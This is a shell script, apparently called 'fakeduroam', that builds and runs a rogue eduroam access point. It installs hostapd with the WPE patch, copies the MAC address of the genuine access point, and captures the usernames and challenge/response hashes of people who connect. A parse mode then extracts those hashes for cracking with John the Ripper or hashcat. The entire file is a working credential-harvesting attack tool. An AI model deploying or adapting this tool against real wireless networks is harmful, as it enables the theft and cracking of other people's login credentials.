#!/bin/sh
# Copyright (C) 2022 İrem Kuyucu <siren@kernal.eu>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

ssid='eduroam'
interface='wlp3s0'
# Where to save the caught username/challenge/response
log_dir='/home/siren/fakeduroam'

if [ `id -u` != "0" ]; then
	echo "This script requires root privileges, try again with doas."
	exit 1
fi

restore() {
	ip link set "$interface" down
	macchanger -r "$interface"
	ip link set "$interface" up

	# Restore suspend on lid close
	sed -i '/zzz/ s/#//' /etc/acpi/handler.sh
}

trap restore INT

case "$1" in
	init)
		# Install and patch hostapd
		mkdir src && cd src
		wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-2.9-wpe.patch
		wget https://w1.fi/releases/hostapd-2.9.tar.gz
		tar -zxf hostapd-2.9.tar.gz
		cd hostapd-2.9
		patch -p1 < ../hostapd-2.9-wpe.patch
		cd hostapd
		make
		make install
		make wpe

		# Create certs
		cd /etc/hostapd-wpe/certs
		./bootstrap
		make install

		# Modify hostapd-wpe.conf
		sed -i -e "/ssid=/s/=.*/=$ssid/" /etc/hostapd-wpe/hostapd-wpe.conf
		sed -i -e "/interface=/s/=.*/=$interface/" /etc/hostapd-wpe/hostapd-wpe.conf
		echo 'Done!'
		;;
	run)
		# Disable suspend on lid close event
		 sed -i '/zzz/ s/./#&/' /etc/acpi/handler.sh

		# Set MAC address of the original AP
		orig_mac=`iwlist "$interface" scan | grep -B 5 "$ssid" | head -n 1 | sed -e 's/.*Address: //'`
		ip link set "$interface" down
		if [ "$orig_mac" ]; then
			ip link set "$interface" address "$orig_mac"
		else
			macchanger -r "$interface"
		fi
		ip link set "$interface" up

		# The caught username/challenge/response will be saved in $log_dir/hostapd-wpe.log
		mkdir $log_dir 2>/dev/null
		cd $log_dir
		hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
		;;
	parse)
		# Remove duplicates and extract hashes
		# $2 must be 'jtr' or 'hashcat'
		grep "$2" $log_dir/hostapd-wpe.log | sed 's/.*\s//' | awk -F: '!a[$1]++' > $log_dir/hashes.txt
		;;
	*)
		echo "Option doesn't exist. Read the script."
esac
